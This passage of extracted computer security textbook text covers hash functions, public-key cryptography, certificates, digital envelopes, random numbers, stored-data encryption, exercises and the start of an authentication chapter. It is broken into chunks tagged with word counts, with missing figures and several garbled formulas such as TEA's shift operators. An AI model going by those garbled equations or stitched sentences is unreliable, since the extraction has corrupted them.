an ­attack in which one party generates a message for another party to sign. For
[Word Count: 59]

6For f(x) = y, x is said to be a preimage of y. Unless f is one-to-one, there may be multiple preimage 
­values for a given y.
[Word Count: 27]

example, suppose Alice agrees to sign an IOU for a small amount that is sent to her 
by Bob. Suppose also that Bob can find two messages with the same hash value, 
one of which requires Alice to pay the small amount and one that requires a large 
payment. Alice signs the first message and Bob is then able to claim that the second 
message is authentic.
[Word Count: 67]

In addition to providing authentication, a message digest also provides data 
­integrity. It performs the same function as a frame check sequence: If any bits in the 
message are accidentally altered in transit, the message digest will be in error.
[Word Count: 40]

Security of Hash Functions  As with symmetric encryption, there are two 
­approaches to attacking a secure hash function: cryptanalysis and brute-force ­attack. 
As with symmetric encryption algorithms, cryptanalysis of a hash function ­involves 
exploiting logical weaknesses in the algorithm.
[Word Count: 39]

The strength of a hash function against brute-force attacks depends solely on 
the length of the hash code produced by the algorithm. For a hash code of length n, 
the level of effort required is proportional to the following:
[Word Count: 39]

Preimage resistant 
2n 
Second preimage resistant 
2n 
Collision resistant 
2n/2
[Word Count: 10]

We have discussed the use of hash functions for message authentication and for the 
creation of digital signatures (the latter is discussed in more detail later in this chapter). 
Here are two other examples of secure hash function applications:
[Word Count: 39]

• Passwords: Chapter 3 explains a scheme in which a hash of a password is
[Word Count: 15]

stored by an operating system rather than the password itself. Thus, the actual 
password is not retrievable by a hacker who gains access to the password file. 
In simple terms, when a user enters a password, the hash of that password is 
compared to the stored hash value for verification. This application requires 
preimage resistance and perhaps second preimage resistance.
	
• Intrusion detection: Store the hash value for a file, H(F), for each file on a system
[Word Count: 77]

and secure the hash ­values (e.g., on a CD-R that is kept secure). One can later 
determine if a file has been modified by recomputing H(F). An intruder would 
need to change F without changing H(F). This application requires weak second 
­preimage ­resistance.
[Word Count: 43]

Of equal importance to symmetric encryption is public-key encryption, which finds 
use in message authentication and key distribution.
[Word Count: 18]

Public-key encryption, first publicly proposed by Diffie and Hellman in 1976 [DIFF76], 
is the first truly revolutionary advance in encryption in literally thousands of years. 
Public-key algorithms are based on mathematical functions rather than on simple oper-
ations on bit patterns, such as are used in symmetric encryption algorithms. More impor-
tant, ­public-key cryptography is asymmetric, involving the use of two separate keys, in 
contrast to symmetric encryption, which uses only one key. The use of two keys has pro-
found consequences in the areas of confidentiality, key ­distribution, and authentication.
[Word Count: 91]

A public-key encryption scheme has six ingredients (Figure 2.6a):
[Word Count: 9]

• Plaintext: This is the readable message or data that is fed into the algorithm as
[Word Count: 16]

input.
	
• Encryption algorithm: The encryption algorithm performs various transforma-
[Word Count: 10]

tions on the plaintext.
	
• Public and private key: This is a pair of keys that have been selected so that
[Word Count: 21]

if one is used for encryption, the other is used for decryption. The exact 
­transformations performed by the encryption algorithm depend on the public 
or private key that is provided as input.7
[Word Count: 32]

• Ciphertext: This is the scrambled message produced as output. It depends on
[Word Count: 13]

the plaintext and the key. For a given message, two different keys will produce 
two different ciphertexts.
	
• Decryption algorithm: This algorithm accepts the ciphertext and the matching
[Word Count: 28]

key and produces the original plaintext.
[Word Count: 6]

As the names suggest, the public key of the pair is made public for others to 
use, while the private key is known only to its owner. A general-purpose public-key 
cryptographic algorithm relies on one key for encryption and a different but related 
key for decryption.
[Word Count: 46]

1.	 Each user generates a pair of keys to be used for the encryption and decryption
[Word Count: 16]

of messages.
	
2.	 Each user places one of the two keys in a public register or other accessible
[Word Count: 18]

file. This is the public key. The companion key is kept private. As Figure 2.6a 
suggests, each user maintains a collection of public keys obtained from others.
	
3.	 If Bob wishes to send a private message to Alice, Bob encrypts the message
[Word Count: 42]

using Alice’s public key.
	
4.	 When Alice receives the message, she decrypts it using her private key. No other
[Word Count: 19]

recipient can decrypt the message because only Alice knows Alice’s private key.
[Word Count: 12]

With this approach, all participants have access to public keys, and private keys 
are generated locally by each participant and therefore need never be ­distributed. 
As long as a user protects his or her private key, incoming communication is secure. 
At any time, a user can change the private key and publish the ­companion public 
key to replace the old public key.
[Word Count: 62]

Figure 2.6b illustrates another mode of operation of public-key cryp­tography. 
In this scheme, a user encrypts data using his or her own private key. Anyone who 
knows the corresponding public key will then be able to decrypt the ­message.
[Word Count: 39]

Note that the scheme of Figure 2.6a is directed toward providing confidential-
ity: Only the intended recipient should be able to decrypt the ciphertext because only 
the intended recipient is in possession of the required private key. Whether in fact
[Word Count: 40]

7The key used in symmetric encryption is typically referred to as a secret key. The two keys used for 
­public-key encryption are referred to as the public key and the private key. Invariably, the private key is 
kept secret, but it is referred to as a private key rather than a secret key to avoid confusion with ­symmetric 
encryption.
[Word Count: 59]

confidentiality is provided depends on a number of factors, including the security of 
the algorithm, whether the private key is kept secure, and the ­security of any proto-
col of which the encryption function is a part.
[Word Count: 37]

The scheme of Figure 2.6b is directed toward providing authentication and/
or data integrity. If a user is able to successfully recover the plaintext from Bob’s 
­ciphertext using Bob’s public key, this indicates that only Bob could have encrypted 
the plaintext, thus providing authentication. Further, no one but Bob would be
[Word Count: 51]

able to modify the plaintext because only Bob could encrypt the ­plaintext with 
Bob’s ­private key. Once again, the actual provision of authentication or data integ-
rity ­depends on a variety of factors. This issue is addressed primarily in Chapter 21, 
but other references are made to it where appropriate in this text.
[Word Count: 53]

Applications for Public-Key Cryptosystems
[Word Count: 4]

Before proceeding, we need to clarify one aspect of public-key cryptosystems that is 
otherwise likely to lead to confusion. Public-key systems are characterized by the use 
of a cryptographic type of algorithm with two keys, one held private and one available 
publicly. Depending on the application, the sender uses either the sender’s private key 
or the receiver’s public key, or both, to perform some type of cryptographic function. 
In broad terms, we can classify the use of public-key cryptosystems into three catego-
ries: digital signature, symmetric key distribution, and encryption of secret keys.
[Word Count: 93]

These applications are discussed in Section 2.4. Some algorithms are suita-
ble for all three applications, whereas others can be used only for one or two of 
these applications. Table 2.3 indicates the applications supported by the algorithms 
­discussed in this section.
[Word Count: 42]

Requirements for Public-Key Cryptography
[Word Count: 4]

The cryptosystem illustrated in Figure 2.6 depends on a cryptographic algorithm 
based on two related keys. Diffie and Hellman postulated this system without dem-
onstrating that such algorithms exist. However, they did lay out the conditions that 
such algorithms must fulfill [DIFF76]:
[Word Count: 42]

1.	 It is computationally easy for a party B to generate a pair (public key PUb,
[Word Count: 16]

­private key PRb).
	
2.	 It is computationally easy for a sender A, knowing the public key and the
[Word Count: 18]

­message to be encrypted, M, to generate the corresponding ciphertext:
[Word Count: 10]

3.	 It is computationally easy for the receiver B to decrypt the resulting ciphertext
[Word Count: 14]

using the private key to recover the original message:
[Word Count: 9]

4.	 It is computationally infeasible for an opponent, knowing the public key, PUb,
[Word Count: 13]

Table 2.3    Applications for Public-Key Cryptosystems
[Word Count: 6]

5.	 It is computationally infeasible for an opponent, knowing the public key, PUb,
[Word Count: 13]

and a ciphertext, C, to recover the original message, M.
[Word Count: 10]

We can add a sixth requirement that, although useful, is not necessary for all 
public-key applications:
[Word Count: 16]

6.	 Either of the two related keys can be used for encryption, with the other used
[Word Count: 16]

M = D[PUb, E(PRb, M)] = D[PRb, E(PUb, M)]
[Word Count: 9]

In this subsection, we briefly mention the most widely used asymmetric encryption 
algorithms. Chapter 21 provides technical details.
[Word Count: 18]

RSA  One of the first public-key schemes was developed in 1977 by Ron Rivest, Adi 
Shamir, and Len Adleman at MIT and first published in 1978 [RIVE78]. The RSA 
scheme has since reigned supreme as the most widely accepted and implemented 
approach to public-key encryption. RSA is a block cipher in which the plaintext and 
ciphertext are integers between 0 and n – 1 for some n.
[Word Count: 67]

Diffie-Hellman Key Agreement  The first published public-key algo­rithm 
­appeared in the seminal paper by Diffie and Hellman that defined public-key 
cryptography [DIFF76] and is generally referred to as Diffie-Hellman key ­exchange, 
or key agreement. A number of commercial products employ this key exchange 
technique.
[Word Count: 44]

The purpose of the algorithm is to enable two users to securely reach agree-
ment about a shared secret that can be used as a secret key for subsequent symmetric 
encryption of messages. The algorithm itself is limited to the exchange of the keys.
[Word Count: 44]

Elliptic Curve Cryptography  The vast majority of the products and standards 
that use public-key cryptography for encryption and digital signatures use RSA. 
The bit length for secure RSA use has increased over recent years, and this has put 
a heavier processing load on applications using RSA. This burden has ramifications, 
especially for electronic commerce sites that conduct large numbers of secure 
transactions. Recently, a competing system has begun to challenge RSA: elliptic 
curve cryptography (ECC). Already, ECC is showing up in standardization efforts, 
including the IEEE (Institute of Electrical and Electronics Engineers) P1363 
Standard for Public-Key Cryptography.
[Word Count: 97]

The principal attraction of ECC compared to RSA is that it appears to offer 
equal security for a far smaller bit size, thereby reducing processing overhead. On 
the other hand, although the theory of ECC has been around for some time, it is 
only recently that products have begun to appear and that there has been sustained 
cryptanalytic interest in probing for weaknesses. Thus, the confidence level in ECC 
is not yet as high as that in RSA.
[Word Count: 78]

2.4	 Digital Signatures and Key Management
[Word Count: 6]

As mentioned in Section 2.3, public-key algorithms are used in a variety of applica-
tions. In broad terms, these applications fall into two categories: digital signatures, 
and various techniques to do with key management and distribution.
[Word Count: 36]

With respect to key management and distribution, there are at least three dis-
tinct aspects to the use of public-key encryption in this regard:
[Word Count: 24]

• The secure distribution of public keys
	
• The use of public-key encryption to distribute secret keys
	
• The use of public-key encryption to create temporary keys for message
[Word Count: 29]

This section provides a brief overview of digital signatures and the various types of 
key management and distribution.
[Word Count: 18]

2.4 / Digital Signatures and Key Management   61
[Word Count: 8]

key, so the message is authenticated both in terms of source and in terms of data 
integrity.
[Word Count: 17]

It is important to emphasize that the digital signature does not provide confi-
dentiality. That is, the message being sent is safe from alteration but not safe from 
eavesdropping. This is obvious in the case of a signature based on a portion of the 
message, because the rest of the message is transmitted in the clear. Even in the 
case of complete encryption, there is no protection of confidentiality because any 
­observer can decrypt the message by using the sender’s public key.
[Word Count: 82]

The key steps can be summarized as follows:
[Word Count: 8]

1.	 User software (client) creates a pair of keys: one public and one private.
	
2.	 Client prepares an unsigned certificate that includes the user ID and user’s
[Word Count: 27]

public key.
	
3.	 User provides the unsigned certificate to a CA in some secure manner. This
[Word Count: 16]

might require a face-to-face meeting, the use of registered e-mail, or happen 
via a web form with e-mail verification.
[Word Count: 19]

a.	 CA uses a hash function to calculate the hash code of the unsigned certifi-
[Word Count: 15]

cate. A hash function is one that maps a variable-length data block or mes-
sage into a fixed-length value called a hash code, such as SHA family that 
we discuss in Section 21.1.
b.	CA encrypts the hash code with the CA’s private key.
[Word Count: 44]

5.	 CA attaches the signature to the unsigned certificate to create a signed certificate.
	
6.	 CA returns the signed certificate to client.
	
7.	 Client may provide the signed certificate to any other user.
[Word Count: 33]

8.	 Any user may verify that the certificate is valid as follows:
[Word Count: 12]

a.	 User calculates the hash code of certificate (not including signature).
b.	User decrypts the signature using CA’s known public key.
c.	 User compares the results of (a) and (b). If there is a match, the certificate
[Word Count: 37]

One scheme has become universally accepted for formatting public-key 
­certificates: the X.509 standard. X.509 certificates are used in most network security 
applications, including IP Security (IPsec), Transport Layer Security (TLS), ­Secure 
Shell (SSH), and Secure/Multipurpose Internet Mail Extension (S/MIME). We 
­examine most of these applications in Part Five.
[Word Count: 48]

Symmetric Key Exchange Using Public-Key Encryption
[Word Count: 6]

Unsigned certiﬁcate:
contains user ID, and
user’s public key,
as well as information
concerning the CA
[Word Count: 16]

Recipient can verify
signature by comparing
hash code values
[Word Count: 9]

Generate hash
code of unsigned
certiﬁcate
[Word Count: 6]

Encrypt hash code
with CA’s private key
to form signature
[Word Count: 10]

Decrypt signature
with CA’s public key
to recover hash code
[Word Count: 10]

Use certiﬁcate to
verify Bob’s public key
Create signed
digital certiﬁcate
[Word Count: 11]

Figure 2.7    Public-Key Certificate Use
[Word Count: 5]

2.4 / Digital Signatures and Key Management   63
[Word Count: 8]

else who uses this new e-mail package faces the same problem with every potential 
correspondent: Each pair of correspondents must share a unique secret key.
[Word Count: 25]

One approach is the use of Diffie-Hellman key exchange. This approach is 
­indeed widely used. However, it suffers the drawback that, in its simplest form, 
Diffie-Hellman provides no authentication of the two communicating partners. 
There are variations to Diffie-Hellman that overcome this problem. Also, there are 
protocols using other public-key algorithms that achieve the same objective.
[Word Count: 56]

Another application in which public-key encryption is used to protect a symmetric 
key is the digital envelope, which can be used to protect a message without need-
ing to first arrange for sender and receiver to have the same secret key. The tech-
nique is referred to as a digital envelope, which is the equivalent of a sealed envelope 
­containing an unsigned letter. The general approach is shown in Figure 2.8. Suppose 
Bob wishes to send a confidential message to Alice, but they do not share a symmet-
ric secret key. Bob does the following:
[Word Count: 95]

1.	 Prepare a message.
	
2.	 Generate a random symmetric key that will be used this one time only.
[Word Count: 18]

3.	 Encrypt that message using symmetric encryption the one-time key.
	
4.	 Encrypt the one-time key using public-key encryption with Alice’s public key.
	
5.	 Attach the encrypted one-time key to the encrypted message and send it to Alice.
[Word Count: 37]

Only Alice is capable of decrypting the one-time key and therefore of recov-
ering the original message. If Bob obtained Alice’s public key by means of Alice’s 
public-key certificate, then Bob is assured that it is a valid key.
[Word Count: 39]

Random numbers play an important role in the use of encryption for various 
­network security applications. We provide a brief overview in this section. The topic 
is examined in detail in Appendix D.
[Word Count: 33]

A number of network security algorithms based on cryptography make use of 
­random numbers. For example,
[Word Count: 16]

• Generation of keys for the RSA public-key encryption algorithm (described
[Word Count: 11]

in Chapter 21) and other public-key algorithms.
	
• Generation of a stream key for symmetric stream cipher.
	
• Generation of a symmetric key for use as a temporary session key or in creating
[Word Count: 33]

a digital envelope.
	
• In a number of key distribution scenarios, such as Kerberos (described in
[Word Count: 16]

Chapter 23), random numbers are used for handshaking to prevent replay 
­attacks.
	
• Session key generation, whether done by a key distribution center or by one of
[Word Count: 27]

These applications give rise to two distinct and not necessarily compatible 
­requirements for a sequence of random numbers: randomness and unpredictability.
[Word Count: 21]

Randomness  Traditionally, the concern in the generation of a sequence of 
­allegedly random numbers has been that the sequence of numbers be random in 
some well-defined statistical sense. The following two criteria are used to validate 
that a sequence of numbers is random:
[Word Count: 43]

• Uniform distribution: The distribution of numbers in the sequence should be
[Word Count: 12]

uniform; that is, the frequency of occurrence of each of the numbers should be 
approximately the same.
	
• Independence: No one value in the sequence can be inferred from the others.
[Word Count: 31]

Although there are well-defined tests for determining that a sequence of num-
bers matches a particular distribution, such as the uniform distribution, there is no such 
test to “prove” independence. Rather, a number of tests can be applied to demonstrate 
if a sequence does not exhibit independence. The general strategy is to apply a number 
of such tests until the confidence that independence exists is sufficiently strong.
[Word Count: 67]

2.5 / Random and Pseudorandom Numbers   65
[Word Count: 7]

Cryptographic applications typically make use of algorithmic techniques for ran-
dom number generation. These algorithms are deterministic and therefore produce 
sequences of numbers that are not statistically random. However, if the algorithm is 
good, the resulting sequences will pass many reasonable tests of randomness. Such 
numbers are referred to as pseudorandom numbers.
[Word Count: 52]

A true random number generator (TRNG) uses a nondeterministic source to 
produce randomness. Most operate by measuring unpredictable natural processes, 
such as pulse detectors of ionizing radiation events, gas discharge tubes, and leaky 
­capac­itors. Intel has developed a commercially available chip that samples ther­
mal noise by ­amplifying the voltage measured across undriven resistors [JUN99]. 
LavaRnd is an open source project for creating truly random numbers using inex-
pensive cameras, open source code, and inexpensive hardware. The ­system uses a 
saturated charge-­coupled device (CCD) in a light-tight can as a chaotic source to
[Word Count: 93]

produce the seed. ­Software processes the result into truly ­random numbers in a 
­variety of formats. The first commercially available TRNG that achieves bit pro-
duction rates comparable with that of PRNGs, is the Intel digital random number 
generator (DRNG) [TAYL11], offered on new multicore chips since May 2012.
[Word Count: 49]

2.6	 Practical Application: Encryption
	 	
of Stored Data
[Word Count: 7]

One of the principal security requirements of a computer system is the protection 
of stored data. Security mechanisms to provide such protection include access con-
trol, intrusion detection, and intrusion prevention schemes, all of which are dis-
cussed in this book. The book also describes a number of technical means by which 
these ­various security mechanisms can be made vulnerable. But beyond technical 
­approaches, these approaches can become vulnerable because of human factors. 
We list a few examples here, based on [ROTH05].
[Word Count: 82]

• In December of 2004, Bank of America employees backed up and sent to its
[Word Count: 15]

backup data center tapes containing the names, addresses, bank account num-
bers, and Social Security numbers of 1.2 million government workers enrolled 
in a charge-card account. None of the data were encrypted. The tapes never 
­arrived and indeed have never been found. Sadly, this method of backing up 
and shipping data is all too common. As an another example, in April of 2005, 
Ameritrade blamed its shipping vendor for losing a backup tape containing 
unencrypted information on 200,000 clients.
	
• In April of 2005, San Jose Medical group announced that someone had physi-
[Word Count: 93]

cally stolen one of its computers and potentially gained access to 185,000 
­unencrypted patient records.
	
• There have been countless examples of laptops lost at airports, stolen from a
[Word Count: 29]

parked car, or taken while the user is away from his or her desk. If the data on the 
laptop’s hard drive are unencrypted, all of the data are available to the thief.
[Word Count: 33]

There are a variety of ways to provide encryption services. A simple approach 
available for use on a laptop is to use a commercially available encryption package 
such as Pretty Good Privacy (PGP). PGP enables a user to generate a key from a 
password and then use that key to encrypt selected files on the hard disk. The PGP 
package does not store the password. To recover a file, the user enters the password,
[Word Count: 74]

PGP generates the password, and PGP decrypts the file. So long as the user protects 
his or her password and does not use an easily guessable password, the files are fully 
protected while at rest. Some more recent approaches are listed in [COLL06]:
[Word Count: 43]

• Back-end appliance: This is a hardware device that sits between servers and stor-
[Word Count: 14]

age systems and encrypts all data going from the server to the storage system and 
decrypts data going in the opposite direction. These devices ­encrypt data at close 
to wire speed, with very little latency. In contrast, encryption software on servers 
and storage systems slows backups. A system man­ager configures the appliance to 
accept requests from specified clients, for which unencrypted data are supplied.
[Word Count: 64]

• Library-based tape encryption: This is provided by means of a co-processor
[Word Count: 12]

board embedded in the tape drive and tape library hardware. The co-processor 
­encrypts data using a nonreadable key configured into the board. The tapes can 
then be sent off-site to a facility that has the same tape drive hardware. The key can 
be exported via secure e-mail or a small flash drive that is transported securely. If 
the matching tape drive hardware co-processor is not available at the other site, the 
target facility can use the key in a software decryption package to recover the data.
	
• Background laptop and PC data encryption: A number of vendors offer soft-
[Word Count: 99]

ware products that provide encryption that is transparent to the ­application and 
the user. Some products encrypt all or designated files and folders. Other prod-
ucts create a virtual disk, which can be maintained locally on the user’s hard 
drive or maintained on a network storage device, with all data on the virtual 
disk encrypted. Various key management solutions are ­offered to restrict access 
to the owner of the data.
[Word Count: 70]

The topics in this chapter are covered in greater detail in [STAL4a]. For coverage of 
cryptographic algorithms, [SCHN96] is a valuable reference work; it contains descrip-
tions of virtually every cryptographic algorithm and protocol in use up to the time of 
the book’s publication. A good classic paper on the topics of this chapter is [DIFF79].
[Word Count: 56]

For anyone interested in the history of code making and code breaking, the 
book to read is [KAHN96]. Although it is concerned more with the impact of cryp-
tology than its technical development, it is an excellent introduction and makes for 
exciting reading. ­Another excellent historical account is [SING99].
[Word Count: 49]

DIFF79     Diffie, W., and Hellman, M. “Privacy and Authentication: An Introduction
[Word Count: 11]

to Cryptography.” Proceedings of the IEEE, March 1979.
KAHN96  Kahn, D. The Codebreakers: The Story of Secret Writing. New York: Scribner,
[Word Count: 21]

1996.
SCHN96   Schneier, B. Applied Cryptography. New York: Wiley, 1996.
SING99     Singh, S. The Code Book: The Science of Secrecy from Ancient Egypt to
[Word Count: 24]

Quantum Cryptography. New York: Anchor Books, 1999.
STAL4a  Stallings, W. Cryptography and Network Security: Principles and Practice,
[Word Count: 17]

Sixth Edition. Upper Saddle River, NJ: Pearson, 2014.
[Word Count: 8]

2.8 	 Key Terms, Review Questions, and Problems
[Word Count: 7]

Advanced Encryption 
    ­Standard (AES)
asymmetric encryption
authentication
brute-force attack
ciphertext
collision resistant
confidentiality
cryptanalysis
Data Encryption Standard  
    (DES)
data integrity
Decryption
Diffie-Hellman key exchange
digital signature
[Word Count: 26]

Digital Signature Standard  
    (DSS)
elliptic curve cryptography
encryption
hash function
keystream
message authentication
message authentication  
    code (MAC)
modes of operation
one-way hash function
plaintext
preimage resistant
private key
pseudorandom number
[Word Count: 30]

public key
public-key certificate
public-key encryption
random number
RSA
second preimage resistant
secret key
secure hash algorithm
[Word Count: 17]

(SHA)
secure hash function
strong collision resistant
symmetric encryption
triple DES
weak collision resistant
[Word Count: 14]

­Special Forces manual (public domain). The document, filename Special Forces.pdf, 
is available at box.com/CompSec3e.
[Word Count: 14]

a.	 Using the two keys (memory words) cryptographic and network security, encrypt the
[Word Count: 13]

Be at the third pillar from the left outside the lyceum theatre tonight at 
seven. If you are distrustful bring two friends.
	
	 Make reasonable assumptions about how to treat redundant letters and excess let-
[Word Count: 34]

ters in the memory words and how to treat spaces and punctuation. Indicate what 
your assumptions are.
	
	 Note: The message is from the Sherlock Holmes novel The Sign of Four.
	
b.	 Decrypt the ciphertext. Show your work.
	
c.	 Comment on when it would be appropriate to use this technique and what its
[Word Count: 52]

­advantages are.
	
2.3	
Consider a very simple symmetric block encryption algorithm, in which 64-bits blocks 
of plaintext are encrypted using a 128-bit key. Encryption is defined as
[Word Count: 27]

where C = ciphertext; K = secret key; K0 = leftmost 64 bits of K; K1 = rightmost 
64 bits of K, ⊕= bitwise exclusive or; and Ä is addition mod 264.
	
a.	 Show the decryption equation. That is, show the equation for P as a function of C,
[Word Count: 49]

K1 and K2.
	
b.	 Suppose an adversary has access to two sets of plaintexts and their correspond-
[Word Count: 17]

ing ciphertexts and wishes to determine K. We have the two equations:
[Word Count: 12]

First, derive an equation in one unknown (e.g., K0). Is it possible to proceed further to 
solve for K0?
	
2.4	
Perhaps the simplest “serious” symmetric block encryption algorithm is the Tiny 
­Encryption Algorithm (TEA). TEA operates on 64-bit blocks of plaintext using 
a ­128-bit key. The plaintext is divided into two 32-bit blocks (L0, R0), and the key 
is ­divided into four 32-bit blocks (K0, K1, K2, K3). Encryption involves repeated 
­application of a pair of rounds, defined as follows for rounds i and i + 1:
[Word Count: 87]

Li = Ri-1 
    Ri = Li-1 Ä F (Ri-1, K0, K1, di)  
	
 Li+1 = Ri
 Ri+1 = Li Ä F(Ri, K2, K3, di+1)
	
	
where F is defined as
[Word Count: 28]

F(M, Kj, Kk, di) = ((M 66 4) Ä Kj) ⊕((M 77 5) Ä Kk) ⊕(M + di)
[Word Count: 18]

and where the logical shift of x by y bits is denoted by x 66 y; the logical right shift 
of x by y bits is denoted by x 77 y; and @i is a sequence of predetermined 
­constants.
	
a.	 Comment on the significance and benefit of using the sequence of constants.
	
b.	 Illustrate the operation of TEA using a block diagram or flow chart type of
[Word Count: 67]

­depiction.
	
c.	 If only one pair of rounds is used, then the ciphertext consists of the 64-bit block
[Word Count: 18]

2.8 / Key Terms, Review Questions, and Problems   69
[Word Count: 9]

a.	 (Message integrity) Alice sends a message x = “Transfer $1000 to Mark” in the
[Word Count: 15]

clear and also sends auth(x) to Bob. Oscar intercepts the message and replaces 
“Mark” with “Oscar.” Will Bob detect this?
	
b.	 (Replay) Alice sends a message x = “Transfer $1000 to Oscar” in the clear and
[Word Count: 36]

also sends auth(x) to Bob. Oscar observes the message and signature and sends 
them 100 times to Bob. Will Bob detect this?
	
c.	 (Sender authentication with cheating third party) Oscar claims that he sent some
[Word Count: 35]

message x with a valid auth(x) to Bob but Alice claims the same. Can Bob clear 
the question in either case?
	
d.	 (Authentication with Bob cheating) Bob claims that he received a message x with
[Word Count: 35]

9I thank William K. Mason, of the magazine staff of The Cryptogram, for providing this example.
[Word Count: 16]

Then, add each column mod 26 and add the result to the running total, mod 26. 
In this example, the running total is (24, 2, 6, 10). Round 2: Using the matrix from 
round 1, rotate the first row left by 1, second row left by 2, third row left by 3, and 
reverse the order of the fourth row. In our example,
[Word Count: 63]

Now, add each column mod 26 and add the result to the running total. The new run-
ning total is (5, 7, 9, 11). This running total is now the input into the first round 
of the compression function for the next block of text. After the final block is
[Word Count: 50]

processed, convert the final running total to letters. For example, if the message is 
ABCDEFGHIJKLMNOP, then the hash is FHJL.
	
a.	 Draw figures of the overall tth logic and the compression function logic.
	
b.	 Calculate the hash function for the 48-letter message “I leave twenty million
[Word Count: 46]

­dollars to my friendly cousin Bill.”
	
c.	 To demonstrate the weakness of tth, find a 48-letter block that produces the same
[Word Count: 21]

f3(f2(f1(k),p),k) = p  for all k, p with 1 … k, p … N
[Word Count: 14]

In words,
	
1.	 M1 takes an input k and produces an output x.
	
2.	 M2 takes inputs x and p giving output z.
	
3.	 M3 takes inputs z and k and produces p.
	
	
The three tables, once constructed, are made public.
	
a.	 It should be clear that it is possible to construct M3 to satisfy the preceding condi-
[Word Count: 58]

tion. As an example, fill in M3 for the following simple case:
[Word Count: 12]

­between two users.
	
c.	 Argue that this is a secure scheme.
[Word Count: 11]

2.9	
Construct a figure similar to Figure 2.8 that includes a digital signature to authenti-
cate the message in the digital envelope.
[Word Count: 22]

2.8 / Key Terms, Review Questions, and Problems   71
[Word Count: 9]

3.1	
Electronic User Authentication Principles
[Word Count: 5]

A Model for Electronic User Authentication
Means of Authentication
Risk Assessment for User Authentication
[Word Count: 14]

The Vulnerability of Passwords
The Use of Hashed Passwords
Password Cracking of User-Chosen Passwords
Password File Access Control
Password Selection Strategies
[Word Count: 21]

Memory Cards
Smart Cards
Electronic Identify Cards
[Word Count: 7]

Physical Characteristics Used in Biometric Applications
Operation of a Biometric Authentication System
Biometric Accuracy
[Word Count: 14]

Password Protocol
Token Protocol
Static Biometric Protocol
Dynamic Biometric Protocol
[Word Count: 10]

3.6	
Security Issues for User Authentication
[Word Count: 6]

3.7	
Practical Application: An Iris Biometric System
[Word Count: 7]

3.8	
Case Study: Security Problems for ATM Systems
[Word Count: 8]

3.10	 Key Terms, Review Questions, and Problems
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	 Discuss the four general means of authenticating a user’s identity.
◆	 Explain the mechanism by which hashed passwords are used for user
[Word Count: 23]

­authentication.
◆	 Understand the use of the Bloom filter in password management.
◆	 Present an overview of token-based user authentication.
◆	 Discuss the issues involved and the approaches for remote user authentication.
◆	 Summarize some of the key security issues for user authentication.
[Word Count: 43]

In essence, identification is the means by which a user provides a claimed identity 
to the system; user authentication is the means of establishing the validity of the claim. 
Note that user authentication is distinct from message authentication. As ­defined in 
Chapter 2, message authentication is a procedure that allows communicating parties 
to verify that the contents of a received message have not been ­altered and that the 
source is authentic. This chapter is concerned solely with user authentication.
[Word Count: 79]

In most computer security contexts, user authentication is the fundamental build-
ing block and the primary line of defense. User authentication is the basis for most 
types of access control and for user accountability. RFC 4949 defines user authenti-
cation as follows:
[Word Count: 42]

1Typically, the password is stored in hashed form on the server and this hash code may not be secret, as 
explained subsequently in this chapter.
[Word Count: 25]

The process of verifying an identity claimed by or for a system entity.  
An ­authentication process consists of two steps:
[Word Count: 20]

●	 Identification step:  Presenting an identifier to the security system. (Identifiers
[Word Count: 11]

should be assigned carefully, because authenticated identities are the basis for 
other security services, such as access control service.)
[Word Count: 19]

●	 Verification step:  Presenting or generating authentication information that
[Word Count: 9]

corroborates the binding between the entity and the identifier.
[Word Count: 9]

This chapter first provides an overview of different means of user authentication 
and then examines each in some detail.
[Word Count: 19]

3.1	 Electronic User Authentication Principles
[Word Count: 5]

NIST SP 800-63-2 (Electronic Authentication Guideline, August 2013) defines elec-
tronic user authentication as the process of establishing confidence in user iden-
tities that are presented electronically to an information system. Systems can use 
the authenticated identity to determine if the authenticated individual is authorized 
to perform particular functions, such as database transactions or access to system 
resources. In many cases, the authentication and transaction or other authorized 
function take place across an open network such as the Internet. Equally authen-
tication and subsequent authorization can take place locally, such as across a local 
area network.
[Word Count: 96]

A Model for Electronic User Authentication
[Word Count: 6]

SP 800-63-2 defines a general model for user authentication that involves a number 
of entities and procedures. We discuss this model with reference to Figure 3.1.
[Word Count: 26]

Figure 3.1  The NIST SP 800-63-2 E-Authentication Architectural Model
[Word Count: 9]

3.1 / Electronic User Authentication Principles   75
[Word Count: 7]

to the verifier in an authentication transaction. The token could be an encryption 
key or an encrypted password that identifies the subscriber. The token may be issued 
by the CSP, generated directly by the subscriber, or provided by a third party. The 
token and credential may be used in subsequent authentication events.
[Word Count: 52]

An implemented system for authentication will differ from or be more com-
plex than this simplified model, but the model illustrates the key roles and functions 
needed for a secure authentication system.
[Word Count: 32]

There are four general means of authenticating a user’s identity, which can be used 
alone or in combination:
[Word Count: 18]

• Something the individual knows: Examples includes a password, a personal
[Word Count: 11]

identification number (PIN), or answers to a prearranged set of questions.
 
• Something the individual possesses: Examples include electronic keycards,
[Word Count: 20]

smart cards, and physical keys. This type of authenticator is referred to as a 
token.
 
• Something the individual is (static biometrics): Examples include recognition
[Word Count: 25]

by fingerprint, retina, and face.
 
• Something the individual does (dynamic biometrics): Examples include recog-
[Word Count: 15]

nition by voice pattern, handwriting characteristics, and typing rhythm.
[Word Count: 9]

All of these methods, properly implemented and used, can provide secure user 
authentication. However, each method has problems. An adversary may be able to 
guess or steal a password. Similarly, an adversary may be able to forge or steal a 
token. A user may forget a password or lose a token. Further, there is a significant 
administrative overhead for managing password and token information on systems 
and securing such information on systems. With respect to biometric authenticators, 
there are a variety of problems, including dealing with false positives and false nega-
tives, user acceptance, cost, and convenience.
[Word Count: 97]

Security risk assessment in general is dealt with in Chapter 14. Here, we introduce 
a specific example as it relates to user authentication. There are three separate
[Word Count: 27]

concepts we wish to relate to one another: assurance level, potential impact, and 
areas of risk.
[Word Count: 16]

Assurance Level  An assurance level describes an organization’s degree of 
certainty that a user has presented a credential that refers to his or her identity. 
More specifically, assurance is defined as (1) the degree of confidence in the vetting 
process used to establish the identity of the individual to whom the credential was 
issued and (2) the degree of confidence that the individual who uses the credential is 
the individual to whom the credential was issued. SP 800-63-2 recognizes four levels 
of assurance:
[Word Count: 83]

• Level 1: Little or no confidence in the asserted identity’s validity. An example
[Word Count: 14]

of where this level is appropriate is a consumer registering to participate in 
a discussion at a company web site discussion board. Typical authentication 
technique at this level would be a user-supplied ID and password at the time 
of the transaction.
 
• Level 2: Some confidence in the asserted identity’s validity. Level 2 creden-
[Word Count: 54]

tials are appropriate for a wide range of business with the public where organi-
zations require an initial identity assertion (the details of which are verified 
